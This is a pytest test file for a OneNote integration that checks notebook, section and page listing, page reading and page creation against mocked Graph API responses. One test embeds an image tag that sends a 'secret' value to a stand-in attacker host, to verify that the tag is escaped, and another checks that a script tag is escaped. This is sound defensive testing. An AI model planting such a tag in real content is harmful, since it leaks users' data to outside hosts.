import re

from broker365.services import onenote
from tests.conftest import G

PAGE = {
    "id": "p1",
    "title": "Notes",
    "createdDateTime": "2026-01-01T00:00:00Z",
    "lastModifiedDateTime": "2026-01-02T00:00:00Z",
    "links": {"oneNoteWebUrl": {"href": "https://onenote/p1"}},
}


def test_notebooks_and_sections(httpx_mock):
    httpx_mock.add_response(
        url=f"{G}/me/onenote/notebooks?%24top=50",
        json={"value": [{"id": "n1", "displayName": "Work", **{"links": PAGE["links"]}}]},
    )
    httpx_mock.add_response(
        url=f"{G}/me/onenote/notebooks/n1/sections?%24top=100",
        json={"value": [{"id": "s1", "displayName": "A", "parentNotebook": {"displayName": "W"}}]},
    )
    assert onenote.onenote_notebooks()[0] == {
        "id": "n1",
        "name": "Work",
        "modified": None,
        "web_url": "https://onenote/p1",
    }
    assert onenote.onenote_sections("n1") == [{"id": "s1", "name": "A", "notebook": "W"}]


def test_pages_per_section_vs_all(httpx_mock):
    httpx_mock.add_response(
        url=re.compile(re.escape(f"{G}/me/onenote/sections/s%2F1/pages?") + ".*"),
        json={"value": [PAGE]},
    )
    httpx_mock.add_response(
        url=re.compile(re.escape(f"{G}/me/onenote/pages?") + ".*"), json={"value": [PAGE]}
    )
    out = onenote.onenote_pages("s/1", limit=10)
    assert out[0] == {
        "id": "p1",
        "title": "Notes",
        "created": "2026-01-01T00:00:00Z",
        "modified": "2026-01-02T00:00:00Z",
        "web_url": "https://onenote/p1",
    }
    assert onenote.onenote_pages()[0]["id"] == "p1"
    first, second = httpx_mock.get_requests()
    assert first.url.params["$top"] == "10"
    assert first.url.params["$select"] == "id,title,createdDateTime,lastModifiedDateTime,links"
    assert second.url.path.endswith("/me/onenote/pages") and second.url.params["$top"] == "50"


def test_read_page_html_to_text(httpx_mock):
    httpx_mock.add_response(
        url=f"{G}/me/onenote/pages/p1/content",
        text="<html><head><title>T</title></head><body><p>Hello &amp; bye</p>"
        "<p>Second</p></body></html>",
        headers={"Content-Type": "text/html"},
    )
    out = onenote.onenote_read_page("p1")
    assert "Hello & bye" in out["text"] and "Second" in out["text"]
    assert "<p>" not in out["text"] and out["truncated"] is False
    httpx_mock.add_response(url=f"{G}/me/onenote/pages/p1/content", text="<p>abcdef</p>")
    out = onenote.onenote_read_page("p1", max_chars=3)
    assert out["text"] == "abc" and out["truncated"] is True


def test_create_page_escapes_title_and_text_body(httpx_mock):
    httpx_mock.add_response(method="POST", url=f"{G}/me/onenote/sections/s1/pages", json=PAGE)
    out = onenote.onenote_create_page("s1", "<script>", "a < b\nline2\n\npara2")
    assert out == {"id": "p1", "title": "Notes", "web_url": "https://onenote/p1"}
    req = httpx_mock.get_requests()[0]
    body = req.content.decode()
    assert req.headers["Content-Type"] == "text/html"
    assert "<title>&lt;script&gt;</title>" in body and "<script>" not in body
    assert "<p>a &lt; b<br/>line2</p><p>para2</p>" in body


def test_create_page_html_body_passthrough(httpx_mock):
    httpx_mock.add_response(method="POST", url=f"{G}/me/onenote/sections/s1/pages", json=PAGE)
    onenote.onenote_create_page("s1", "T", "<ul><li>x</li></ul>", body_type="html")
    assert "<body><ul><li>x</li></ul></body>" in httpx_mock.get_requests()[0].content.decode()


def test_html_body_cannot_load_remote_resources(httpx_mock):
    httpx_mock.add_response(
        method="POST", url=f"{G}/me/onenote/sections/S1/pages", json={"id": "P1", "title": "t"}
    )
    body = '<p>Hi <b>there</b><br/></p><img src="https://attacker.example/x?d=secret">'
    onenote.onenote_create_page("S1", "t", body, body_type="html")
    sent = httpx_mock.get_requests()[0].content.decode()
    assert "<p>Hi <b>there</b><br></p>" in sent
    assert "<img" not in sent and "&lt;img" in sent


def test_pages_across_all_sections_error_suggests_section(httpx_mock):
    import re

    import pytest

    from broker365.errors import Broker365Error

    httpx_mock.add_response(
        url=re.compile(re.escape(f"{G}/me/onenote/pages") + ".*"),
        status_code=400,
        json={"error": {"code": "20266", "message": "too many sections"}},
    )
    with pytest.raises(Broker365Error, match="section_id"):
        onenote.onenote_pages()
